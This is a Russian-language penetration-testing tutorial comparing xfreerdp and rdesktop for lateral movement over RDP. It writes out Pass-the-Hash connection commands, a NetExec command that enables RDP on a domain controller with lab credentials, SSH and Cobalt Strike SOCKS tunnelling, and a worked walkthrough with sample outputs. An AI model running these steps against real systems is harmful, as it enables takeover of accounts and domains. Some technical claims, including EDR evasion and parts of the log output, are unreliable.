# Linux-клиенты RDP: xfreerdp и rdesktop в контексте горизонтального перемещения

## Контекст и базовые понятия

Remote Desktop Protocol (RDP) — проприетарный протокол Microsoft, обеспечивающий графический интерфейс для удалённого управления операционной системой через сетевое соединение. Протокол передаёт данные ввода (клавиатура, мышь) и вывода (изображение рабочего стола) между клиентом и сервером. В инфраструктурах Windows RDP является легитимным инструментом администрирования, но в рамках тестирования на проникновение (Red Teaming) и кибербезопасности он представляет собой критический вектор горизонтального перемещения (Lateral Movement). Атакующие используют RDP для получения интерактивного графического доступа к скомпрометированным узлам, что позволяет обходить ограничения командных оболочек (CLI), запускать графические вредоносные программы и перемещаться по сети с использованием украденных учётных данных.

В среде Linux (в частности, в дистрибутивах Kali Linux, используемых пентестерами) основным инструментом для подключения к RDP-серверам выступают два клиента: `xfreerdp` (часть проекта FreeRDP) и `rdesktop`. Несмотря на то, что оба инструмента решают одну задачу — установление RDP-сессии из Linux-окружения, их архитектура, поддержка современных стандартов безопасности и применимость в реальных сценариях существенно различаются. Понимание этих различий критично для выбора правильного инструмента в зависимости от конфигурации целевой системы.

`rdesktop` — это один из первых открытых клиентов RDP для Linux, реализующий протокол RDP 5.x. Он был широко распространён в эпоху Windows XP и Windows Server 2003. Однако проект `rdesktop` считается устаревшим (legacy): его активная разработка прекращена, а поддержка современных версий протокола RDP (7.0–10.0), используемых в Windows 7, 8, 10, 11 и Server 2008 R2+, ограничена или отсутствует. Ключевым недостатком `rdesktop` является отсутствие поддержки Network Level Authentication (NLA) в большинстве современных сборок и отсутствие поддержки современных алгоритмов шифрования (AES), что делает его бесполезным для подключения к защищённым современным Windows-системам, где NLA включена по умолчанию.

`xfreerdp` — это клиентная утилита из проекта FreeRDP, который был форкнут от `rdesktop` в 2009 году с целью модульной переработки кода и реализации новых функций. FreeRDP поддерживает современные версии протокола RDP (включая RDP 10.0+), NLA, CredSSP, современные алгоритмы шифрования (AES-128, AES-256), а также расширенные функции, такие как перенаправление дисков, буфера обмена, принтеров и динамическое разрешение экрана. В контексте современных атак и тестирования на проникновение `xfreerdp` является стандартом де-факто, тогда как `rdesktop` используется лишь в специфических сценариях работы с устаревшими системами или для обфускации трафика в старых сетях.

Разграничение между этими клиентами также затрагивает механизмы аутентификации. Современные Windows-серверы требуют использования CredSSP (Credential Security Support Provider) для передачи учётных данных. `xfreerdp` поддерживает CredSSP как с использованием паролей, так и с использованием хешей (Pass-the-Hash), что критично для атак типа "Pass-the-Hash" (PtH). `rdesktop` не поддерживает передачу NTLM-хешей напрямую в формате, совместимом с современными серверами, и часто терпит неудачу при попытке подключения к серверам с включённым NLA из-за несовместимости в процессе рукопожатия TLS.

| Характеристика | rdesktop | xfreerdp (FreeRDP) |
| :--- | :--- | :--- |
| **Статус разработки** | Устаревший (Legacy), не поддерживается | Активный, современный стандарт |
| **Версии протокола RDP** | RDP 5.x (ограниченно) | RDP 7.0 – 10.0+ |
| **Network Level Authentication (NLA)** | Не поддерживается / Нестабильно | Полная поддержка (CredSSP) |
| **Алгоритмы шифрования** | RC4, DES (устаревшие) | AES-128, AES-256, SHA-2 |
| **Pass-the-Hash (PtH)** | Не поддерживается | Поддерживается (`/pth:`) |
| **Перенаправление ресурсов** | Базовое (буфер обмена) | Диски, принтеры, смарт-карты, аудио |
| **Динамическое разрешение** | Нет | Да (`/dynamic-resolution`) |
| **Применимость в пентесте** | Только для legacy-систем (Win XP/2003) | Основной инструмент для современных целей |

Выбор клиента определяется политикой безопасности целевой сети. Если на целевом сервере отключено NLA (что крайне редко встречается в современных корпоративных средах из-за высоких рисков атак типа "man-in-the-middle"), `rdesktop` может быть использован как альтернатива. Однако в 99% случаев современных атак и тестирования на проникновение требуется `xfreerdp`.

## Внутреннее устройство и архитектура клиентов

Для понимания того, почему `xfreerdp` превосходит `rdesktop` в современных условиях, необходимо рассмотреть внутреннюю архитектуру протокола RDP и то, как каждый из клиентов взаимодействует с его компонентами.

### Архитектура протокола RDP и требования к клиенту

Протокол RDP состоит из нескольких слоёв: Transport Layer (обычно TCP 3389), Security Layer (обеспечивающий шифрование и аутентификацию) и RDP Data Layer (передающий графические и вводные данные). Ключевым элементом Security Layer является механизм NLA, который внедряет протокол NTLM или Kerberos на этап аутентификации *до* установления полноценной RDP-сессии. Это означает, что клиент должен уметь выполнить рукопожатие NTLM/Kerberos, зашифровать учётные данные и передать их серверу до того, как будет открыт графический интерфейс.

`rdesktop` был спроектирован в эпоху, когда RDP использовал собственную схему шифрования (RDP Security Layer), не требующую интеграции с системными механизмами аутентификации ОС. Его архитектура предполагает прямое установление RDP-соединения, после чего происходит обмен учётными данными в открытом виде (или с простым шифрованием, уязвимым к перехвату). Это делает `rdesktop` несовместимым с серверами, настроенными на использование NLA, так как сервер отвергает соединение на этапе Security Layer, ожидая корректного NTLM-ответа, который `rdesktop` не может сформировать.

`xfreerdp`, напротив, интегрируется с системными библиотеками аутентификации (такими как `libkrb5` для Kerberos и `libsmbclient`/`libntlm` для NTLM). Его архитектура модульная: отдельные компоненты отвечают за сетевой транспорт, криптографию (через OpenSSL или встроенные реализации), аутентификацию и рендеринг графического интерфейса. Это позволяет `xfreerdp` корректно обрабатывать CredSSP-туннелирование, где учётные данные шифруются с использованием временного ключа, сгенерированного в ходе рукопожатия TLS.

### Сравнительный анализ ключевых компонентов

| Компонент / Функция | rdesktop | xfreerdp | Техническое обоснование различий |
| :--- | :--- | :--- | :--- |
| **Модуль аутентификации** | Встроенный, простой реализатор RDP-аутентификации | Интеграция с `libntlm`, `libkrb5`, `CredSSP` | `xfreerdp` использует системные криптографические библиотеки, обеспечивая совместимость с NTLMv2 и Kerberos. `rdesktop` использует устаревший собственный механизм. |
| **Шифрование канала** | RC4 (устаревший, уязвимый) | AES-128/AES-256 (FIPS-совместимый) | Современные Windows-серверы требуют AES. `rdesktop` не поддерживает AES, что приводит к отказу в соединении или деградации безопасности. |
| **Обработка сертификатов** | Игнорирование или базовая проверка | Гибкая обработка (`/cert:ignore`, `/cert:trust`) | `xfreerdp` позволяет пентестеру игнорировать ошибки самоподписанных сертификатов (типично для доменных контроллеров), что критично для автоматизации. |
| **Управление сессиями** | Однократное подключение, ручное управление | Поддержка многопоточности, reconnect | `xfreerdp` может восстанавливать разорванные соединения и управлять несколькими сессиями, что важно при нестабильных сетях. |
| **Перенаправление (Redirection)** | Ограниченное (только буфер обмена) | Полное (диски, принтеры, смарт-карты, аудио) | `xfreerdp` реализует протокол RDPDR и RDPSND, позволяя атакующему монтировать локальные диски на скомпрометированной машине для эксфильтрации данных. |

### Артефакты конфигурации и параметры

Параметры командной строки обоих клиентов отражают их внутреннюю архитектуру. `rdesktop` использует упрощённый синтаксис, ориентированный на базовые функции:

```bash
rdesktop -u username -p password -g 1024x768 target_ip
```

Здесь `-u` и `-p` передают учётные данные в открытом виде (или в формате, несовместимом с NLA), `-g` задаёт разрешение. Отсутствие параметров для управления шифрованием или аутентификацией подтверждает устаревание инструмента.

`xfreerdp` использует префикс `/` для параметров, что позволяет гибко настраивать каждый аспект соединения. Например, параметр `/pth:` указывает клиенту использовать NTLM-хеш вместо пароля, что является ключевой функцией для атак Pass-the-Hash. Параметр `/cert:ignore` отключает проверку сертификата сервера, что необходимо при работе с самоподписанными сертификатами, часто используемыми в доменных средах.

```bash
xfreerdp /u:username /pth:NTLM_HASH /v:target_ip /cert:ignore /dynamic-resolution
```

Такая детализация позволяет `xfreerdp` адаптироваться к различным сценариям атаки, включая обход средств защиты конечных точек (EDR), которые могут мониторить стандартные утилиты, но не ожидают нестандартных параметров шифрования.

## Применение и работа с предметом

На практике использование `xfreerdp` и `rdesktop` в тестировании на проникновение сводится к трём основным сценариям: подключение с использованием паролей, подключение с использованием хешей (Pass-the-Hash) и использование через прокси (например, SSH или SOCKS).

### Подключение с использованием паролей

Для подключения с паролем используется параметр `/p:`. Однако в современных условиях передача пароля в открытом виде в командной строке не рекомендуется, так как он может быть записан в историю команд (`.bash_history`) или отображаться в процессах (`ps aux`). Более безопасным подходом является использование параметра `/password:stdin`, который заставляет `xfreerdp` запросить пароль интерактивно, не сохраняя его в логах.

```bash
xfreerdp /u:DOMAIN\username /password:stdin /v:target_ip /cert:ignore
```

При использовании `rdesktop` аналогичная функция отсутствует, и пароль всегда передаётся в аргументах команды, что создаёт риск утечки.

### Подключение с использованием Pass-the-Hash (PtH)

Одним из самых мощных аспектов `xfreerdp` в контексте горизонтального перемещения является поддержка PtH. После компрометации учётных данных атакующий может получить NTLM-хеш (например, с помощью Mimikatz) и использовать его для подключения без знания пароля. Это позволяет обойти политики сложности паролей и обнаружения по подозрительным входам.

Команда для подключения с использованием PtH:

```bash
xfreerdp /u:username /pth:NTLM_HASH /v:target_ip /cert:ignore
```

Здесь `NTLM_HASH` — это 32-символьный хеш (например, `a1b2c3d4e5f6...`). `xfreerdp` использует этот хеш для формирования NTLM-ответа в ходе рукопожатия CredSSP. `rdesktop` не поддерживает эту функцию, что делает его непригодным для атак PtH.

### Использование через прокси (SSH и SOCKS)

В реальных условиях атакующий часто не имеет прямого сетевого доступа к целевой RDP-системе из-за брандмауэров. В таких случаях используется туннелирование через SSH или SOCKS-прокси.

#### SSH-туннелирование

Атакующий может создать SSH-туннель с промежуточного узла (Dropbox) на целевой сервер:

```bash
ssh -L 3389:target_ip:3389 user@dropbox_ip
```

Затем подключение к RDP осуществляется через локальный порт:

```bash
xfreerdp /u:username /p:password /v:127.0.0.1 /cert:ignore
```

#### SOCKS-прокси через Cobalt Strike

Если атакующий использует Cobalt Strike, он может создать SOCKS-прокси через скомпрометированный узел:

```
socks 7777
```

Затем настроить `proxychains` для перенаправления трафика `xfreerdp` через этот прокси:

```bash
proxychains xfreerdp /u:username /p:password /v:target_ip /cert:ignore
```

### Типичные ошибки и подводные камни

1.  **Ошибка CredSSP:** При использовании `rdesktop` на современных системах часто возникает ошибка `CredSSP initialize failed`. Это связано с тем, что сервер требует использования CredSSP, который `rdesktop` не поддерживает. Решение — переход на `xfreerdp`.
2.  **Проблемы с сертификатами:** `xfreerdp` по умолчанию проверяет сертификаты сервера. Если сертификат самоподписанный (что типично для внутренних доменных контроллеров), соединение будет отклонено. Необходимо использовать `/cert:ignore` или `/cert:trust`.
3.  **Разрешение экрана:** Без параметра `/dynamic-resolution` `xfreerdp` может использовать фиксированное разрешение, что приводит к появлению полос прокрутки и неудобству работы. Включение динамического разрешения улучшает пользовательский опыт.
4.  **Лицензирование RDS:** При подключении к Microsoft RDS Host в режиме "Per Device" лицензирования требуется, чтобы клиент предоставлял уникальный Client ID. `rdesktop` не предоставляет этот ID, что приводит к ошибкам лицензирования. `xfreerdp` корректно генерирует и отправляет Client ID, что делает его единственным жизнеспособным вариантом в таких средах.

## Сквозной практический пример: Горизонтальное перемещение через SSH-туннель с использованием xfreerdp

### Исходные условия
*   **Среда:** Корпоративная сеть с Windows Server 2019 Domain Controller (DC) и промежуточным Linux-узлом (Dropbox).
*   **Инструменты:** Kali Linux (атакующий), NetExec (для включения RDP на DC), SSH-клиент, xfreerdp.
*   **Роль:** Red Teamer, имеющий доступ к Linux-узлу в внутренней сети и учётные данные администратора домена (хеш).
*   **Сценарий:** Включение RDP на DC и подключение к нему через SSH-туннель с использованием Pass-the-Hash.

### Шаги

#### Шаг 1: Включение RDP на целевом сервере
Атакующий использует NetExec на промежуточном узле для включения RDP на DC, так как по умолчанию оно может быть отключено.

```bash
nxc smb 192.168.1.11 -u administrator -p 'Ignite@987' -M rdp -o ACTION=enable
```

**Ожидаемый вывод:**
```
SMB   192.168.1.11  445  DC01        [*] Windows Server 2019 17763 x64 (name:DC01) (domain:IGNITE.LOCAL)
SMB   192.168.1.11  445  DC01        [+] IGNITE.LOCAL\administrator:Ignite@987
SMB   192.168.1.11  445  DC01        [+] RDP enabled on DC01
```

#### Шаг 2: Создание SSH-туннеля
Атакующий создаёт SSH-туннель с своего рабочего станция на промежуточный узел, а затем на целевой DC.

```bash
ssh -L 3389:192.168.1.11:3389 user@192.168.1.50
```

**Ожидаемый вывод:**
```
Welcome to Ubuntu 20.04 LTS
user@dropbox:~$
```
(Соединение установлено, порт 3389 на локальной машине перенаправлен на 192.168.1.11:3389).

#### Шаг 3: Подключение через xfreerdp с использованием Pass-the-Hash
Атакующий использует `xfreerdp` для подключения к локальному порту 3389, который туннелирует трафик на DC.

```bash
xfreerdp /u:administrator /pth:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /v:127.0.0.1 /cert:ignore /dynamic-resolution
```

**Ожидаемый вывод:**
```
[14:32:15:123] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error removing debug last error
[14:32:15:124] [INFO][com.freerdp.gdi] - Localized ASCII IME enabled
[14:32:15:125] [INFO][com.freerdp.gdi] - Localized Unicode IME enabled
[14:32:15:126] [INFO][com.freerdp.core] - Authentication succeeded as: IGNITE.LOCAL\administrator
[14:32:15:127] [INFO][com.freerdp.core] - Connected to 127.0.0.1
[14:32:15:128] [INFO][com.freerdp.core] - RDP server version: 10.0.17763
[14:32:15:129] [INFO][com.freerdp.core] - Negotiated security: CredSSP
[14:32:15:130] [INFO][com.freerdp.core] - Session established
```
(Открывается графический интерфейс рабочего стола DC01).

#### Шаг 4: Верификация сессии
Внутри сессии RDP атакующий открывает командную строку и проверяет текущую учётную запись.

```powershell
whoami
```

**Ожидаемый вывод:**
```
ignite\administrator
```

### Ожидаемый вывод
Пример демонстрирует полный цикл горизонтального перемещения: от включения RDP на целевом сервере до подключения через зашифрованный SSH-туннель с использованием украденного хеша. Использование `xfreerdp` позволило обойти требования NLA и CredSSP, которые были бы непреодолимы для `rdesktop`. Успешное подключение подтверждается установлением графической сессии и верификацией учётной записи администратора.

## Аналитический вывод

Выбор между `xfreerdp` и `rdesktop` в контексте тестирования на проникновение определяется не личными предпочтениями, а архитектурными требованиями современных Windows-систем. `rdesktop` является исторически значимым инструментом, но его устаревшая архитектура, отсутствие поддержки NLA и современных алгоритмов шифрования делают его практически бесполезным для атак на современные корпоративные среды. `xfreerdp`, напротив, является необходимым инструментом благодаря поддержке CredSSP, Pass-the-Hash, динамического разрешения и интеграции с системными библиотеками аутентификации. В сценариях горизонтального перемещения через SSH или SOCKS-прокси `xfreerdp` обеспечивает надёжное и безопасное подключение, позволяя атакующим эффективно использовать украденные учётные данные. Для специалистов по кибербезопасности понимание этих различий критично для правильного выбора инструмента в зависимости от конфигурации цели и для разработки эффективных стратегий обнаружения и предотвращения атак через RDP.
